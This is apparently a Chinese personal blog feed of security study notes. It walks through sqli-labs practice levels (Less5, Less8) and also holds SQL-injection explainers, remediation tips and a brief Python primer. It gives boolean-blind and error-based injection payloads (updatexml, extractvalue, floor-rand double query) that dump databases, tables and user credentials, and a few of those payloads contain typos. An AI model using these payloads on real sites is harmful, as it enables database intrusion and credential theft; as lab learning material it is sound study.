src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214818187.png" alt="image-20230719214818187"></p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230719214945753.png" alt="image-20230719214945753"></p><pre><code>?id=1&#39;)) and length(database())  --+</code></pre><p>outfile前期条件：</p><p>在MySQL里面使用select … into outfile可以把数据导出到文本文件上<br>里面有几个参数<br>secure_file_priv 用来限制导出效果。他有三个属性：<br>null限制不能导出<br>为空可以自定义<br>为一个路径则只能导出到指定路径</p><p>具体设置在phpstudy中的配置文件mysql.ini中在最后一行加入 secure_file_priv即可c</p><h4 id="sql-labs靶场less8"><a href="#sql-labs靶场less8" class="headerlink" title="sql-labs靶场less8"></a>sql-labs靶场less8</h4><p>bool盲注常用的函数</p><pre><code>database()   显示数据库名称left(a,b)    从左侧截取a的前b位substr(a,b,c) 从b位置开始，截取字符串a到c的长度mid(a,b,c)  从b位置开始，截取a字符串的c位length()    返回字符串长度ascii()      将某个字符转换成ascii值char()       将ascii码转换为对应的字符</code></pre><p>打开源码看了一下</p><p>这道题可以使用时间盲注，不能使用报错注入，因为报错的信息被注释掉了</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515103641066.png" alt="image-20230515103641066"></p><p>1.判断注入点</p><pre><code>?id=1   页面正常，但是没有显示消息</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515105031032.png" alt="image-20230515105031032"></p><p>加单引号</p><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515105151868.png" alt="image-20230515105151868"></p><p>页面无回显，应该是报错了</p><p>继续试试</p><pre><code>?id=1 and 1=1?id=1 and 1=2 页面都正常，说明不是数字型注入，?id=1&#39; and 1=1 --+  页面正常，可以正常的显示    真      真    真?id=1&#39; and 1=2 --+   真       假    假页面发生变化(没有报错，只是查不出来数据，和上面的无回显不一样)，说明是单引号闭合的字符型注入。</code></pre><p>1.查看数据库版本</p><pre><code>?id=1&#39; and left(version(),1)=5 %23</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515112258415.png" alt="image-20230515112258415"></p><p>这个数据库的版本为5.7.42 ，上面的语句是看版本号的第一位是不是5，如果回显正常，那么说明第一位就是5</p><p>上图显示正常，剩下的慢慢测，一般使用脚本。</p><p>2.猜解数据库的长度</p><pre><code>?id=1&#39; and length(database(),1)&gt;&#39;a&#39; --+</code></pre><p><img src="/2023/05/12/sql-labs%E9%9D%B6%E5%9C%BA/image-20230515114347238.png" alt="image-20230515114347238"></p><p>数据库长度为 8 时，页面回显正常。这里说明下，长度要一个一个的试，这里只是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。</p><p>3.猜数据库名字</p><pre><code>?id=1&#39; and left(databse(),1)&gt;&#39;a&#39; --+</code></pre><p><code>left(a,b)</code>：返回a字符串从左至b位数，详细看下面用法</p><p>4.猜表名</p><pre><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</code></pre><p>5.猜字段名</p><pre><code>?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+</code></pre><p>6.猜数据</p><p>用户名</p><pre><code>?id=1&#39; and left((select username from users limit x,1),y)=&quot;&quot;--+</code></pre><p>通过变换x，y的值可以得到所有的用户名 。</p><p>密码</p><pre><code>?id=1&#39; and left((select password from users limit x,1),y)=&quot;&quot;--+</code></pre><p>通过变换 x，y 的值可以得到所有的密码 。</p><p>通过布尔盲注手工注入比较繁琐，可以用脚本。</p><p>下面分享脚本</p><h4 id="sql-labs靶场less9"><a href="#sql-labs靶场less9" class="headerlink" title="sql-labs靶场less9"></a>sql-labs靶场less9</h4><h4 id="sql-labs靶场less10"><a href="#sql-labs靶场less10" class="headerlink" title="sql-labs靶场less10"></a>sql-labs靶场less10</h4><h4 id="sql-labs靶场less11"><a href="#sql-labs靶场less11" class="headerlink" title="sql-labs靶场less11"></a>sql-labs靶场less11</h4><h4 id="sql-labs靶场less12"><a href="#sql-labs靶场less12" class="headerlink" title="sql-labs靶场less12"></a>sql-labs靶场less12</h4><h4 id="sql-labs靶场less13"><a href="#sql-labs靶场less13" class="headerlink" title="sql-labs靶场less13"></a>sql-labs靶场less13</h4><h4 id="sql-labs靶场less14"><a href="#sql-labs靶场less14" class="headerlink" title="sql-labs靶场less14"></a>sql-labs靶场less14</h4><h4 id="sql-labs靶场less15"><a href="#sql-labs靶场less15" class="headerlink" title="sql-labs靶场less15"></a>sql-labs靶场less15</h4><h4 id="sql-labs靶场less16"><a href="#sql-labs靶场less16" class="headerlink" title="sql-labs靶场less16"></a>sql-labs靶场less16</h4><h4 id="sql-labs靶场less17"><a href="#sql-labs靶场less17" class="headerlink" title="sql-labs靶场less17"></a>sql-labs靶场less17</h4><h4 id="sql-labs靶场less18"><a href="#sql-labs靶场less18" class="headerlink" title="sql-labs靶场less18"></a>sql-labs靶场less18</h4><h4 id="sql-labs靶场less19"><a href="#sql-labs靶场less19" class="headerlink" title="sql-labs靶场less19"></a>sql-labs靶场less19</h4><h4 id="sql-labs靶场less20"><a href="#sql-labs靶场less20" class="headerlink" title="sql-labs靶场less20"></a>sql-labs靶场less20</h4><h4 id="sql-labs靶场less21"><a href="#sql-labs靶场less21" class="headerlink" title="sql-labs靶场less21"></a>sql-labs靶场less21</h4><h4 id="sql-labs靶场less22"><a href="#sql-labs靶场less22" class="headerlink" title="sql-labs靶场less22"></a>sql-labs靶场less22</h4><h4 id="sql-labs靶场less23"><a href="#sql-labs靶场less23" class="headerlink" title="sql-labs靶场less23"></a>sql-labs靶场less23</h4><h4 id="sql-labs靶场less24"><a href="#sql-labs靶场less24" class="headerlink" title="sql-labs靶场less24"></a>sql-labs靶场less24</h4><h4 id="sql-labs靶场less25"><a href="#sql-labs靶场less25" class="headerlink" title="sql-labs靶场less25"></a>sql-labs靶场less25</h4>]]></content>
      
      
      <categories>
          
          <category> 漏洞靶场学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>报错注入</title>
      <link href="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="报错注入的定义"><a href="#报错注入的定义" class="headerlink" title="报错注入的定义"></a>报错注入的定义</h2><p>当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是SQL语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><h2 id="常见的函数"><a href="#常见的函数" class="headerlink" title="常见的函数"></a>常见的函数</h2><p>1.extractvalue()</p><p>2.updataxml()</p><p>3.count() + rand() +floor() +group  by() 导致的主键重复</p><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>extractvalue (xml_document,xpath_string)</p><p>第一个参数是xml文档对象名称</p><p>第二个参数作用是从xml文档对象中返回查询到的字符串值，返回结果长度限制在32位字符。</p><pre><code>extractvalue(null,concat(0x7e,(sqli_inject),0x7e))注：利用extractvalue()对数据进行一个排序，指定一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示&quot;-&quot;号。</code></pre><h2 id="UpdateXml函数"><a href="#UpdateXml函数" class="headerlink" title="UpdateXml函数"></a>UpdateXml函数</h2><p>函数用法：</p><p>UPDATEXML(XML_document,XPath_string,new_value)</p><p>三个字符串参数：</p><p>1  .XML_Document是String格式，为XML文档对象的名称</p><p>2   .XPath_string(<a href="https://so.csdn.net/so/search?q=Xpath&spm=1001.2101.3001.7020">Xpath</a> 格式的字符串)</p><p>3    .new_value,string格式，替换查找到符合条件的数据</p><h3 id="为什么可以用于报错注入："><a href="#为什么可以用于报错注入：" class="headerlink" title="为什么可以用于报错注入："></a>为什么可以用于报错注入：</h3><p>UpdateXml 函数实际上是去更新了XML文档，但是我们在XML文档路径的位置里面写入了<a href="https://so.csdn.net/so/search?q=%E5%AD%90%E6%9F%A5%E8%AF%A2&spm=1001.2101.3001.7020">子查询</a>，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码。</p><h2 id="sqli靶场less5"><a href="#sqli靶场less5" class="headerlink" title="sqli靶场less5"></a>sqli靶场less5</h2><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230514102049350.png" alt="image-20230514102049350"></p><p>1.判断注入类型</p><p>get 1’ and ’1’ =’1 回显如下：</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231110006.png" alt="image-20230510231110006"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510231854074.png" alt="image-20230510231854074"></p><pre><code>？id=1’ 报错，单引号导致，页面显示数据库的报错信息，确定注入点为单引号字符型</code></pre><p>2.判断报错函数是否可用</p><pre><code>？id=0&#39; and updatexml(1,0x7e)--a</code></pre><p>页面正常报错，确定报错函数可用</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232558988.png" alt="image-20230510232558988"></p><p>3.脱库</p><p>获取所有的数据库，地址栏输入：</p><pre><code>?id=1&#39; and updatexml(1,    substr(      concat(0x7e,          (select group_concat(schema_name)           from information_schema.schemata)       )    ,34,31),3) -- a</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510232905062.png" alt="image-20230510232905062"></p><p>获取security库中的所有表，地址栏输入：</p><pre><code>?id=1&#39; and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39;))) %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233507675.png" alt="image-20230510233507675"></p><p>查user表中的列名</p><pre><code>？id=1&#39; union select 1,2, (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;)),1)) %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510233925272.png" alt="image-20230510233925272"></p><p>查字段（双查询注入）</p><pre><code>1&#39; union select 1, count(*), concat((select concat(username,&#39;:&#39;,password) from users  limit 0,1), floor(rand(0)*2)) a from information_schema.tables group by a  %23</code></pre><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234240463.png" alt="image-20230510234240463"></p><p>将0改为1,2,3,4……..</p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234427307.png" alt="image-20230510234427307"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234518718.png" alt="image-20230510234518718"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234547823.png" alt="image-20230510234547823"></p><p><img src="/2023/05/09/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/image-20230510234636472.png" alt="image-20230510234636472"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2023/05/07/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/07/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是sql注入？"><a href="#什么是sql注入？" class="headerlink" title="什么是sql注入？"></a>什么是sql注入？</h2><p><code>SQL注入就是在web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库的任意操作。</code></p><p>php代码举例：</p><pre><code>$query = &quot;select * from users where id = $_GET[&#39;id&#39;];</code></pre><h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>sql注入漏洞的产生需要满足以下两个条件：</p><p>1.<code>参数用户可控</code>：前端传给后端的参数内容是用户可以控制的；</p><p>2.<code>参数传入数据库查询</code>：传入的参数拼接到sql语句，且带入数据库查询。</p><p>当传入的id参数为 1’ 时，</p><pre><code>select * from users where id=1&#39;</code></pre><p>这不符合数据库语法的规范，所以会报错。</p><p>当传入的id参数为and 1=1 时，</p><pre><code>select * from users where id= 1 and 1 = 1</code></pre><p>因为1 = 1为真，且where语句中id=1也为真，所以页面会返回与id = 1相同的结果，</p><p>当传入的id参数为and 1 =2时，由于 1=2不成立，所以返回假，页面就会返回与id =1不同的结果。</p><h2 id="mysql查询语句"><a href="#mysql查询语句" class="headerlink" title="mysql查询语句"></a>mysql查询语句</h2><p>1.在不知道任何条件时，</p><pre><code>select 要查询的字段名 from 库名.表名</code></pre><p>2.在知道一条已知条件时，</p><pre><code>select 要查询的字段名 from 库名.表名 where 已知条件的字段名=&#39;已知条件的值&#39;</code></pre><p>3.在知道两条已知条件时，</p><pre><code>select 要查询的字段名 from 库名.表名 where 已知条件1的字段名 = &#39;已知条件1的值&#39; and 已知条件2的字段名=&#39;已知条件2的值&#39;</code></pre><h2 id="limit用法"><a href="#limit用法" class="headerlink" title="limit用法"></a>limit用法</h2><p>limit的使用格式为limit m ,n, 其中m是记录开始的位置，从0开始，表示第一条记录；n是指取n条记录。</p><p>eg：limit 0,1表示从第一条记录开始，去一条记录。</p><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>mysql中常见的注释符： #或  –空格  或  /**/</p><h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><pre><code>内联注释的形式：/*!code*/</code></pre><p>内联注释可以用于整个sql语句</p><pre><code>index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</code></pre><p>?加参数  &amp;连接参数</p><h2 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h2><p>1.按照提交的数据类型有：数字型、字符型和搜索型</p><p>2.按照提交方式有：</p><p>  (1)<code>GET注入</code>:提交数据的方式是<code>GET</code>,注入点的位置在GET参数部分。例如有这样一个链接<code> http://xxx.com/news.php?id=1</code>, id是注入点。</p><p>  (2)<code>POST注入</code>:使用POST方式提交数据，注入点位置在POST数据部分，常发生在表单中（输入框）。</p><p>  (3)<code>cookie注入</code>:HTTP请求的时候会带上客户端的cookie，注入点在cookie当中的某个字段中。</p><p>  (4)<code>http头注入</code>:注入点在HTTP请求头部的某个字段中。比如存在User-Agent字段中。严格讲的话，cookie其实应该也算是头部注入的一种形式。因为在HTTP请求的时候，cookie是头部的一个字段。</p><p>3.按照执行效果有：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入</p><h2 id="sql注入危害"><a href="#sql注入危害" class="headerlink" title="sql注入危害"></a>sql注入危害</h2><p>1.<code>数据库信息泄漏</code>：数据库中存放的用户的隐私信息的泄露。</p><p>2.<code>网页篡改</code>：通过操纵数据库对特定网页进行篡改。</p><p>3.<code>网站被挂马，传播恶意软件</code>：修改数据库一些字段值，嵌入网马链接，进行挂马攻击。</p><p>4.<code>数据库被恶意操作</code>：数据库服务器被攻击，数据库的系统管理员账户被篡改。</p><p>5.<code>服务器被远程控制，被安装后门</code>。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p><p>6.<code>破坏硬盘数据，瘫痪全系统</code>。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.<code>过滤危险字符</code>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。</p><p>2.<code>使用预编译语句</code>：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的<code>增加</code>、<code>删除</code>、<code>修改</code>、<code>查询</code>。</p><p>3.<code>特殊字符转义、使用严格的数据类型</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇博客</title>
      <link href="/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/05/06/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h1><h1 id="一、数学计算符"><a href="#一、数学计算符" class="headerlink" title="一、数学计算符"></a>一、数学计算符</h1><p>1.+加 -减 *乘 /除 //整除 %余数 **幂指数</p><p>2.变量：python的容器，跟print函数（打印数据类型及函数对象）</p><p>异曲同工：变量可以存放数据类型及函数对象，简短的代码（结果也属于Python中的数据类型）</p><p>使用变量来存放字符串及数值</p><p>存放的过程在Python中叫’赋值’，赋值就是=符号，不是数学中的等于</p><p>Python中的等于是”==”，赋值是”=”，一个’=’叫赋值，两个”==”叫等于</p><p>eg：1.</p><p>a=’小许’  b=3  c=3+4</p><p>print(c)</p><ol><li></li></ol><p>2==2</p><p>true 布尔值就是由条件判断得到的</p><p>变量，帮助我们减少代码的复杂性，增强可读性，不管用户输入什么都不会影响我们提前写好代码</p><h1 id="二、命名"><a href="#二、命名" class="headerlink" title="二、命名"></a>二、命名</h1><p>命名：采用驼峰命名法，字母开头(小写)，下换线结尾</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
